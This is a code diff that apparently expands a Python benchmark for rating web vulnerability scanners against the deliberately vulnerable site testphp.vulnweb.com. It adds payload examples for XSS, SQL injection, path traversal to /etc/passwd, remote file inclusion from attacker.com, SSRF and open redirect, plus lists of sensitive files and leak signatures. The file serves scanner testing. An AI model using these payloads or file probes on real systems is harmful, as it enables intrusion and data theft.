@@ -20,106 +20,179 @@ class TestPHPBenchmark:
         """Загрузка известных уязвимостей из GitHub репозитория"""
         return {
             'xss': [
-                {
-                    'method': 'POST',
-                    'url': 'http://testphp.vulnweb.com/search.php',
-                    'parameter': 'searchFor',
-                    'type': 'reflected_xss'
-                },
-                {
-                    'method': 'POST', 
-                    'url': 'http://testphp.vulnweb.com/guestbook.php',
-                    'parameter': 'name',
-                    'type': 'reflected_xss'
-                },
-                {
-                    'method': 'POST',
-                    'url': 'http://testphp.vulnweb.com/secured/newuser.php',
-                    'parameter': 'uuname',
-                    'type': 'reflected_xss'
-                },
+                # Reflected XSS
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/listproducts.php',
                     'parameter': 'cat',
-                    'type': 'reflected_xss'
+                    'type': 'reflected_xss',
+                    'payload_example': '<script>alert(1)</script>'
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/listproducts.php',
                     'parameter': 'artist',
-                    'type': 'reflected_xss'
-                },
-                {
-                    'method': 'GET',
-                    'url': 'http://testphp.vulnweb.com/hpp/',
-                    'parameter': 'pp',
-                    'type': 'reflected_xss'
+                    'type': 'reflected_xss',
+                    'payload_example': '<script>alert(1)</script>'
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/hpp/params.php',
                     'parameter': 'p',
-                    'type': 'reflected_xss'
-                }
-            ],
-            'sqli': [
+                    'type': 'reflected_xss',
+                    'payload_example': '<script>alert(1)</script>'
+                },
+                {
+                    'method': 'POST',
+                    'url': 'http://testphp.vulnweb.com/search.php',
+                    'parameter': 'searchFor',
+                    'type': 'reflected_xss',
+                    'payload_example': '<script>alert(1)</script>'
+                },
                 {
                     'method': 'POST',
                     'url': 'http://testphp.vulnweb.com/secured/newuser.php',
                     'parameter': 'uuname',
-                    'type': 'error_based'
+                    'type': 'reflected_xss',
+                    'payload_example': '<script>alert(1)</script>'
+                },
+                # Stored XSS
+                {
+                    'method': 'POST', 
+                    'url': 'http://testphp.vulnweb.com/guestbook.php',
+                    'parameter': 'name',
+                    'type': 'stored_xss',
+                    'payload_example': '<script>alert(1)</script>'
                 },
                 {
-                    'method': 'POST',
-                    'url': 'http://testphp.vulnweb.com/userinfo.php',
-                    'parameter': 'uname',
-                    'type': 'blind'
+                    'method': 'POST', 
+                    'url': 'http://testphp.vulnweb.com/guestbook.php',
+                    'parameter': 'comment',
+                    'type': 'stored_xss',
+                    'payload_example': '<script>alert(1)</script>'
                 },
+                # DOM XSS
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/',
+                    'parameter': 'fragment',
+                    'type': 'dom_xss',
+                    'payload_example': '<img onerror=alert(1) src=x>'
+                },
+                # HTTP Parameter Pollution XSS
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/hpp/',
+                    'parameter': 'pp',
+                    'type': 'reflected_xss',
+                    'payload_example': '<script>alert(1)</script>'
+                }
+            ],
+            'sqli': [
+                # Error-based SQL Injection
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/artists.php',
                     'parameter': 'artist',
-                    'type': 'error_based'
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/listproducts.php',
                     'parameter': 'cat',
-                    'type': 'error_based'
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/listproducts.php',
                     'parameter': 'artist',
-                    'type': 'error_based'
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/product.php',
                     'parameter': 'pic',
-                    'type': 'error_based'
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php',
                     'parameter': 'id',
-                    'type': 'error_based'
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
                 },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/AJAX/infocateg.php',
                     'parameter': 'id',
-                    'type': 'error_based'
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
+                },
+                {
+                    'method': 'POST',
+                    'url': 'http://testphp.vulnweb.com/secured/newuser.php',
+                    'parameter': 'uuname',
+                    'type': 'error_based',
+                    'payload_example': "' OR 1=1--"
+                },
+                # UNION-based SQL Injection
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/artists.php',
+                    'parameter': 'artist',
+                    'type': 'union_based',
+                    'payload_example': '-1 UNION SELECT 1,version(),user()'
+                },
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/listproducts.php',
+                    'parameter': 'cat',
+                    'type': 'union_based',
+                    'payload_example': '-1 UNION SELECT 1,2,3,4'
+                },
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/listproducts.php',
+                    'parameter': 'artist',
+                    'type': 'union_based',
+                    'payload_example': '-1 UNION SELECT 1,2,3,4'
+                },
+                # Boolean-based blind SQL Injection
+                {
+                    'method': 'POST',
+                    'url': 'http://testphp.vulnweb.com/userinfo.php',
+                    'parameter': 'uname',
+                    'type': 'boolean_blind',
+                    'payload_example': "test' AND 1=1--"
+                },
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/product.php',
+                    'parameter': 'pic',
+                    'type': 'boolean_blind',
+                    'payload_example': "1 AND 1=1"
+                },
+                # Time-based blind SQL Injection
+                {
+                    'method': 'POST',
+                    'url': 'http://testphp.vulnweb.com/userinfo.php',
+                    'parameter': 'uname',
+                    'type': 'time_blind',
+                    'payload_example': "test'; WAITFOR DELAY '00:00:05'--"
                 }
             ],
             'lfi': [
+                # Local File Inclusion
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/showimage.php',
                     'parameter': 'file',
                     'type': 'local_file_inclusion',
-                    'payload_example': 'showimage.php'
+                    'payload_example': '../../../etc/passwd'
                 },
                 {
                     'method': 'GET',
@@ -127,15 +200,95 @@ class TestPHPBenchmark:
                     'parameter': 'file',
                     'type': 'php_filter',
                     'payload_example': 'php://filter/convert.base64-encode/resource=showimage.php'
+                },
+                # Directory Traversal
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/showimage.php',
+                    'parameter': 'file',
+                    'type': 'directory_traversal',
+                    'payload_example': '../../../../etc/passwd'
+                },
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/showimage.php',
+                    'parameter': 'file',
+                    'type': 'directory_traversal',
+                    'payload_example': '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
+                }
+            ],
+            'rfi': [
+                # Remote File Inclusion
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/showimage.php',
+                    'parameter': 'file',
+                    'type': 'remote_file_inclusion',
+                    'payload_example': 'http://attacker.com/evil.jpg'
                 }
             ],
             'ssrf': [
+                # Server-Side Request Forgery
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/showimage.php',
+                    'parameter': 'file',
+                    'type': 'server_side_request_forgery',
+                    'payload_example': 'http://127.0.0.1:80'
+                },
                 {
                     'method': 'GET',
                     'url': 'http://testphp.vulnweb.com/showimage.php',
                     'parameter': 'file',
                     'type': 'server_side_request_forgery',
                     'payload_example': 'http://127.0.0.1:22'
+                },
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/showimage.php',
+                    'parameter': 'file',
+                    'type': 'server_side_request_forgery',
+                    'payload_example': 'http://localhost:3306'
+                }
+            ],
+            'hpp': [
+                # HTTP Parameter Pollution
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/hpp/params.php',
+                    'parameter': 'pp',
+                    'type': 'parameter_pollution',
+                    'payload_example': 'p=1&pp=2&pp=3'
+                }
+            ],
+            'crlf': [
+                # CRLF Injection
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/',
+                    'parameter': 'redirect',
+                    'type': 'crlf_injection',
+                    'payload_example': '%0d%0aSet-Cookie: test=value'
+                }
+            ],
+            'redirect': [
+                # Open Redirect
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/',
+                    'parameter': 'return',
+                    'type': 'open_redirect',
+                    'payload_example': 'http://evil.com'
+                }
+            ],
+            'idor': [
+                # Insecure Direct Object Reference
+                {
+                    'method': 'GET',
+                    'url': 'http://testphp.vulnweb.com/product.php',
+                    'parameter': 'id',
+                    'type': 'insecure_direct_object_reference',
+                    'payload_example': '1,2,3,4,5'
                 }
             ]
         }
@@ -143,31 +296,154 @@ class TestPHPBenchmark:
     def _load_known_files(self) -> List[str]:
         """Загрузка известных чувствительных файлов"""
         return [
+            # Backup files
             'http://testphp.vulnweb.com/index.zip',
+            'http://testphp.vulnweb.com/backup.zip',
+            'http://testphp.vulnweb.com/site.zip',
+            
+            # IDE files
             'http://testphp.vulnweb.com/.idea/workspace.xml',
-            'http://testphp.vulnweb.com/admin/',
+            'http://testphp.vulnweb.com/.idea/modules.xml',
+            'http://testphp.vulnweb.com/.vscode/settings.json',
+            
+            # Configuration files
             'http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess',
+            'http://testphp.vulnweb.com/.htaccess',
             'http://testphp.vulnweb.com/crossdomain.xml',
+            'http://testphp.vulnweb.com/web.config',
+            
+            # Version control
             'http://testphp.vulnweb.com/CVS/Root',
+            'http://testphp.vulnweb.com/CVS/Entries',
+            'http://testphp.vulnweb.com/.git/config',
+            'http://testphp.vulnweb.com/.svn/entries',
+            
+            # PHP info and debug files
             'http://testphp.vulnweb.com/secured/phpinfo.php',
-            'http://testphp.vulnweb.com/_mmServerScripts/mysql.php'
+            'http://testphp.vulnweb.com/phpinfo.php',
+            'http://testphp.vulnweb.com/info.php',
+            'http://testphp.vulnweb.com/test.php',
+            
+            # Database scripts
+            'http://testphp.vulnweb.com/_mmServerScripts/mysql.php',
+            'http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php',
+            
+            # Admin interfaces
+            'http://testphp.vulnweb.com/admin/',
+            'http://testphp.vulnweb.com/admin/index.php',
+            'http://testphp.vulnweb.com/administrator/',
+            
+            # Log files
+            'http://testphp.vulnweb.com/error.log',
+            'http://testphp.vulnweb.com/access.log',
+            'http://testphp.vulnweb.com/debug.log',
+            
+            # Environment files
+            'http://testphp.vulnweb.com/.env',
+            'http://testphp.vulnweb.com/.env.local',
+            'http://testphp.vulnweb.com/.env.production',
+            
+            # Legacy Dreamweaver files
+            'http://testphp.vulnweb.com/_notes/dwsync.xml',
+            'http://testphp.vulnweb.com/Connections/connDB.php'
         ]
     
     def _load_known_directories(self) -> List[str]:
         """Загрузка известных директорий с листингом"""
         return [
+            # Media directories
             'http://testphp.vulnweb.com/Flash/',
+            'http://testphp.vulnweb.com/pictures/',
+            'http://testphp.vulnweb.com/images/',
+            'http://testphp.vulnweb.com/media/',
+            
+            # Version control directories
             'http://testphp.vulnweb.com/CVS/',
-            'http://testphp.vulnweb.com/.idea/'
+            'http://testphp.vulnweb.com/.git/',
+            'http://testphp.vulnweb.com/.svn/',
+            
+            # IDE directories
+            'http://testphp.vulnweb.com/.idea/',
+            'http://testphp.vulnweb.com/.vscode/',
+            
+            # Backup directories
+            'http://testphp.vulnweb.com/backup/',
+            'http://testphp.vulnweb.com/backups/',
+            'http://testphp.vulnweb.com/old/',
+            
+            # Admin directories
+            'http://testphp.vulnweb.com/admin/',
+            'http://testphp.vulnweb.com/administrator/',
+            'http://testphp.vulnweb.com/secured/',
+            
+            # Development directories
+            'http://testphp.vulnweb.com/test/',
+            'http://testphp.vulnweb.com/dev/',
+            'http://testphp.vulnweb.com/debug/',
+            
+            # Legacy directories
+            'http://testphp.vulnweb.com/_mmServerScripts/',
+            'http://testphp.vulnweb.com/_notes/'
         ]
     
     def _load_known_info_disclosure(self) -> List[str]:
         """Загрузка известных случаев утечки информации"""
         return [
+            # Email addresses
             'wvs@acunetix.com',
             'test@gmail.com', 
+            'wasp@acunetix.com',
+            'admin@testphp.vulnweb.com',
+            'webmaster@testphp.vulnweb.com',
+            
+            # Internal URLs and IPs
             'http://127.0.0.1',
-            'wasp@acunetix.com'
+            'http://localhost',
+            'http://192.168.',
+            'http://10.0.',
+            'http://172.16.',
+            
+            # Version information
+            'PHP/5.1.6',
+            'Apache/2.2.3',
+            'MySQL',
+            'phpMyAdmin',
+            
+            # Database information
+            'mysql_connect',
+            'mysql_query',
+            'SELECT * FROM',
+            'root@localhost',
+            
+            # Path disclosure
+            '/var/www/',
+            '/usr/local/',
+            'C:\\inetpub\\',
+            'C:\\xampp\\',
+            
+            # Configuration details
+            'allow_url_include',
+            'register_globals',
+            'magic_quotes',
+            'safe_mode',
+            
+            # Error messages
+            'Warning: mysql_',
+            'Fatal error:',
+            'Notice: Undefined',
+            'Parse error:',
+            
+            # Sensitive files content
+            'root:x:0:0:',
+            '[boot loader]',
+            '<?php',
+            'BEGIN RSA PRIVATE KEY',
+            
+            # Default credentials
+            'test:test',
+            'admin:admin',
+            'root:root',
+            'guest:guest'
         ]
     
     def analyze_scan_results(self, scan_results: List[Dict[str, Any]]) -> Dict[str, Any]:
@@ -195,7 +471,7 @@ class TestPHPBenchmark:
         }
         
         # Анализ по категориям
-        for vuln_type in ['xss', 'sqli', 'lfi', 'ssrf']:
+        for vuln_type in ['xss', 'sqli', 'lfi', 'rfi', 'ssrf', 'hpp', 'crlf', 'redirect', 'idor']:
             category_analysis = self._analyze_category(vuln_type, scan_results)
             analysis['by_category'][vuln_type] = category_analysis
             
@@ -521,9 +797,14 @@ class TestPHPBenchmark:
         """Анализ покрытия OWASP Top 10"""
         owasp_mapping = {
             'xss': 'A03:2021 – Injection',
-            'sqli': 'A03:2021 – Injection',
+            'sqli': 'A03:2021 – Injection', 
             'lfi': 'A03:2021 – Injection',
-            'ssrf': 'A10:2021 – Server-Side Request Forgery'
+            'rfi': 'A03:2021 – Injection',
+            'ssrf': 'A10:2021 – Server-Side Request Forgery',
+            'hpp': 'A03:2021 – Injection',
+            'crlf': 'A03:2021 – Injection',
+            'redirect': 'A01:2021 – Broken Access Control',
+            'idor': 'A01:2021 – Broken Access Control'
         }
         
         coverage = {}
